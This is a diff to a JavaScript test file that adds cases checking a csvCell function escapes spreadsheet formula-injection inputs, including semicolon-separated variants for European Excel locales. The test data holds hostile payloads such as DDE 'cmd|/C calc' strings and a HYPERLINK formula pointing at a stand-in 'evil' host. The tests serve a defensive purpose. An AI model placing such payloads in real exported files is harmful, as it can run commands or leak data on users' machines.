@@ -59,8 +59,31 @@ describe('csvCell robustness', () => {
   });
 });
 
+describe('csvCell formula payloads', () => {
+  test.each([
+    ['-1+cmd|" /C calc"!A0', `"'-1+cmd|"" /C calc""!A0"`],
+    ['@SUM(A1)', `"'@SUM(A1)"`],
+    ['\n@SUM(A1)', `"'\n@SUM(A1)"`],
+    ['=HYPERLINK("http://evil/")', `"'=HYPERLINK(""http://evil/"")"`],
+    ['x,=1+1', '"x,=1+1"'],
+    ['"q"', '"""q"""'],
+    ['Zoë 😀', '"Zoë 😀"'],
+  ])('csvCell(%j) => %j', (input, expected) => {
+    expect(csvCell(input)).toBe(expected);
+  });
+
+  // Excel in locales whose list separator is ";" (de, fr, nl, ...) splits an unquoted field on ";",
+  // so the part after it would start a new cell. Quoted, it stays one cell.
+  test.each([['Laptop;=HYPERLINK("http://evil/?"&A1;"click")'], ['x;@SUM(1+1)*cmd|"/C calc"!A0'], ["x;=cmd|' /C calc'!A0"], ['x;+1'], ['x;-1+1']])(
+    'a ";"-separated payload %j stays inside one quoted cell',
+    (input) => {
+      expect(csvCell(input)).toBe(`"${input.replace(/"/g, '""')}"`);
+    }
+  );
+});
+
 describe('exportCsv', () => {
-  const things = descriptor([fd('name', 'string', { sortable: true }), fd('price', 'number')], {
+  const things = descriptor([fd('name', 'string', { sortable: true }), fd('price', 'number'), fd('owner', 'toOne')], {
     sorts: ['name'],
     filters: [{ key: 'status', kind: 'enum', enum: ['draft', 'live'] }],
     pagination: { defaultLimit: 20, maxLimit: 2 },
@@ -70,6 +93,7 @@ describe('exportCsv', () => {
     ['name', { name: 'Name' }],
     ['label', { name: 'Label', csv: (m) => `#${m.id()}` }],
     ['avatar', { name: 'Avatar' }],
+    ['owner', { name: 'Owner' }],
     ['price', { name: 'Price', hidden: true }],
   ];
 
